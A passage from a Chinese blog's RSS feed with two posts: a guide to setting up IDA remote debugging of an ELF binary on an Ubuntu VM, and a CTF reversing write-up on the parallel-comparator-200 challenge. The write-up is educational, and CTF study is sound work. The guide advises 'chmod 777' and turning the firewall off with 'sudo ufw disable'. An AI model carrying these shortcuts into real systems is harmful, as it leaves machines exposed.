&lt;p&gt;以下是成功之后的情况：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181851891-1113362872.png&#34;
	width=&#34;741&#34;
	height=&#34;386&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181851891-1113362872_hu6774377077683776129.png 480w, https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181851891-1113362872_hu689808574775205573.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;191&#34;
		data-flex-basis=&#34;460px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181852351-1074976889.png&#34;
	width=&#34;548&#34;
	height=&#34;134&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181852351-1074976889_hu1605035468572077048.png 480w, https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181852351-1074976889_hu10880871160623633193.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;408&#34;
		data-flex-basis=&#34;981px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;连接的第一步：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181852717-1851040276.png&#34;
	width=&#34;576&#34;
	height=&#34;390&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181852717-1851040276_hu16477421693337181519.png 480w, https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181852717-1851040276_hu6712774515538210201.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;147&#34;
		data-flex-basis=&#34;354px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;将对应的文件复制到linux中，一个32位一个64位请自己选择。（以64位为例&lt;/p&gt;
&lt;p&gt;然后我将需要调试的文件一并复制到一个专门的文件夹：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181852949-2000538611.png&#34;
	width=&#34;282&#34;
	height=&#34;128&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181852949-2000538611_hu1989936463266499526.png 480w, https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181852949-2000538611_hu7519253462246213159.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;220&#34;
		data-flex-basis=&#34;528px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后在linux中运行，这里我用了【chmod 777 linux_server64】指令打开权限，然后【./linux_server64】开启服务：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181853164-803567829.png&#34;
	width=&#34;538&#34;
	height=&#34;86&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181853164-803567829_hu13404639742177045547.png 480w, https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181853164-803567829_hu642834632959675553.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;625&#34;
		data-flex-basis=&#34;1501px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;此时，linux上的步骤已经完成了。&lt;/p&gt;
&lt;p&gt;如果是第一次操作的话需要加几个步骤：&lt;/p&gt;
&lt;p&gt;【ifconfig】来找到自己虚拟机的ip地址：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181853391-879678766.png&#34;
	width=&#34;270&#34;
	height=&#34;68&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181853391-879678766_hu130896309569732098.png 480w, https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181853391-879678766_hu1465818517505159195.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;397&#34;
		data-flex-basis=&#34;952px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;我的虚拟机在这一步出现了问题，这是后面我要说的。&lt;/p&gt;
&lt;p&gt;【pwd】记录所在位置的路径：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181853647-1102459947.png&#34;
	width=&#34;265&#34;
	height=&#34;31&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181853647-1102459947_hu1314545771787809703.png 480w, https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181853647-1102459947_hu9712963888804280408.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;854&#34;
		data-flex-basis=&#34;2051px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后就是主机上IDA的设置了：&lt;/p&gt;
&lt;p&gt;像之前一样将文件拖入IDA，然后打开。&lt;/p&gt;
&lt;p&gt;打开之后在菜单栏：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181853848-741429943.png&#34;
	width=&#34;216&#34;
	height=&#34;50&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181853848-741429943_hu16982154216639483324.png 480w, https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181853848-741429943_hu11994100958829430422.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;432&#34;
		data-flex-basis=&#34;1036px&#34;
	
&gt;select
debugger&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181854079-356618477.png&#34;
	width=&#34;348&#34;
	height=&#34;314&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181854079-356618477_hu1740290839643894548.png 480w, https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181854079-356618477_hu16064772911458023344.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;110&#34;
		data-flex-basis=&#34;265px&#34;
	
&gt;选择remote
linux debugger&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181854373-1669812308.png&#34;
	width=&#34;290&#34;
	height=&#34;496&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181854373-1669812308_hu7453255059450121543.png 480w, https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181854373-1669812308_hu12180049111609604470.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;58&#34;
		data-flex-basis=&#34;140px&#34;
	
&gt;选择process
options&lt;/p&gt;
&lt;p&gt;这一步就比较重要了，也比较容易出错，改写什么我都在图中标注好了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181854742-821305326.png&#34;
	width=&#34;556&#34;
	height=&#34;292&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181854742-821305326_hu8515078260746278894.png 480w, https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181854742-821305326_hu8157173211644600103.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;190&#34;
		data-flex-basis=&#34;456px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;如果没有问题的话，我们按下F9就可以开始调试了，同时linux虚拟机上会显示连接成功的消息：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181854986-2089077480.png&#34;
	width=&#34;232&#34;
	height=&#34;22&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181854986-2089077480_hu8368291009210425773.png 480w, https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181854986-2089077480_hu3578306514910702300.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1054&#34;
		data-flex-basis=&#34;2530px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;之后便可以开始调试了，具体怎么调试就是另一个问题了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一些问题：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;第一个问题：&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;我遇到的第一个问题就是IDA反映了这么一段话：&lt;/p&gt;
&lt;p&gt;The file cant be loaded by the debugger plugin.&lt;/p&gt;
&lt;p&gt;Please verify that the parameters are valid.&lt;/p&gt;
&lt;p&gt;调试器插件无法加载文件，请验证参数是否有效。&lt;/p&gt;
&lt;p&gt;我解决这个问题的方法是关闭了防火墙，大概放开端口也可以解决。&lt;/p&gt;
&lt;p&gt;Ubuntu关闭防火墙：【sudo ufw disable】&lt;/p&gt;
&lt;p&gt;Ubuntu打开防火墙：【sudo ufw enable】&lt;/p&gt;
&lt;p&gt;Ubuntu开启端口：【sudo ufw allow 端口号】&lt;/p&gt;
&lt;p&gt;&lt;em&gt;第二个问题：&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181855218-1177897661.png&#34;
	width=&#34;514&#34;
	height=&#34;16&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181855218-1177897661_hu4585176298710701305.png 480w, https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181855218-1177897661_hu5136211410314530081.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;3212&#34;
		data-flex-basis=&#34;7710px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这个是因为填写的ip地址不正确，至于为什么填了个这个，是因为我第一次ifconfig的时候没有ip地址…&lt;/p&gt;
&lt;p&gt;&lt;em&gt;第三个问题：&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181855404-1080253292.png&#34;
	width=&#34;480&#34;
	height=&#34;19&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181855404-1080253292_hu2448830128938999638.png 480w, https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/1858293-20200419181855404-1080253292_hu12864107637067592141.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;2526&#34;
		data-flex-basis=&#34;6063px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这个也是因为输错了ip，不过这次不是localhost了，是我另外的虚拟机的。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;VMware下我的Ubuntu虚拟机没有IP地址解决方案&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在我尝试连接虚拟机的时候，第一次并没有填写正确的ip地址，因为根本没有给我。&lt;/p&gt;
&lt;p&gt;在网上找解决方案，看到一个人的博客里写着自己修改了开机选项，关闭了一些选项，把他们开启就好了：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_38222534/article/details/80635272&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.csdn.net/qq_38222534/article/details/80635272&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最后，你问我这题怎么做？&lt;/p&gt;
&lt;p&gt;那得等我用熟动态调试才行。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【攻防世界】对于parallel-comparator-200的理解的感想</title>
        <link>https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/</link>
        <pubDate>Sat, 18 Apr 2020 09:10:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/</guid>
        <description>&lt;p&gt;这是一道代码审计的题&lt;/p&gt;
&lt;p&gt;pthread.h库函数涉及到UNIX内核了，一些关于线程的函数现在还读不太懂。但是不妨碍我们做题。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/1858293-20200418171027323-1835635121.png&#34;
	width=&#34;576&#34;
	height=&#34;198&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/1858293-20200418171027323-1835635121_hu5091610408740188681.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/1858293-20200418171027323-1835635121_hu1924782451758301444.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;290&#34;
		data-flex-basis=&#34;698px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;主函数告诉我们输入flag到user_string函数中。然后is_ok是函数high_optimized_parallel_comparsion的返回值。我们要做的是让这个函数的返回值为1。&lt;/p&gt;
&lt;p&gt;进入函数high_optimized_parallel_comparsion：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/1858293-20200418171027839-1488161047.png&#34;
	width=&#34;919&#34;
	height=&#34;390&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/1858293-20200418171027839-1488161047_hu13433390682441921916.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/1858293-20200418171027839-1488161047_hu4221931803078380229.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;235&#34;
		data-flex-basis=&#34;565px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;函数的一部分是在告诉我们：&lt;/p&gt;
&lt;p&gt;声明了两个变量：initialization_number和first_letter，这两个变量下面都要用到。&lt;/p&gt;
&lt;p&gt;initialization_number是一个大于64的随机数，而first_letter是前面那个数对26取模再加97；&lt;/p&gt;
&lt;p&gt;一个数对26取模，取模后的数的范围是0-25，所以我们反推initialization_number的范围是97-122；&lt;/p&gt;
&lt;p&gt;接下来的pthread_create函数用到了checking函数，我们先往下看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/1858293-20200418171028276-412563873.png&#34;
	width=&#34;929&#34;
	height=&#34;275&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/1858293-20200418171028276-412563873_hu6408644781253924065.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/1858293-20200418171028276-412563873_hu7651205054791854681.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;337&#34;
		data-flex-basis=&#34;810px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这里声明了result，根据最后的函数我们可以得知，reault必须为0。&lt;/p&gt;
&lt;p&gt;而恰好checking函数会返回result的值：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/1858293-20200418171028689-235432473.png&#34;
	width=&#34;602&#34;
	height=&#34;146&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/1858293-20200418171028689-235432473_hu2604364896990063431.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/1858293-20200418171028689-235432473_hu855833341893454455.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;412&#34;
		data-flex-basis=&#34;989px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;将checking函数和high_optimized_parallel_comparsion函数中的pthread_create函数相结合，我们可以分析出来：argument[0]
是first_letter，argument[1] 是数组differences中对应下标的值，而argument[2]就是我们要输入的对应位置的字符。&lt;/p&gt;
&lt;p&gt;经过一番逆向推导，result的值要保持为0，那么0^任何数都是这个数本身，所以我们有：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;argument[2] = argument[0] + argument[1]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;既有：我们输入的字符由first_letter和数组differences组成。&lt;/p&gt;
&lt;p&gt;换句话说，我们只要知道first_letter，知道initialization_number是多少，就可以了。&lt;/p&gt;
&lt;p&gt;initialization_number的范围我们在上文已经推测出，是一个定值。&lt;/p&gt;
&lt;p&gt;经过爆破我们可以得到自己想要的答案：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/1858293-20200418171029038-2119885714.png&#34;
	width=&#34;214&#34;
	height=&#34;428&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/1858293-20200418171029038-2119885714_hu7625456681872610414.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/1858293-20200418171029038-2119885714_hu9331744363462790176.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;50&#34;
		data-flex-basis=&#34;120px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;实际上涉及到的进程函数我还是很想搞明白的，但是要搞明白的话就需要了解更多的知识。慢慢来吧，从语言到操作系统到内核，一口可吃不成个胖子。&lt;/p&gt;
&lt;p&gt;虽然我想说C语言天下第一，但是不得不承认有些时候C还是比较折磨人的。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【个人记录】SimpleRev解题过程中遇到的问题：数据处理和逆模运算</title>
        <link>https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95simplerev%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%92%8C%E9%80%86%E6%A8%A1%E8%BF%90%E7%AE%97/</link>
        <pubDate>Sun, 12 Apr 2020 10:34:00 +0000</pubDate>
        
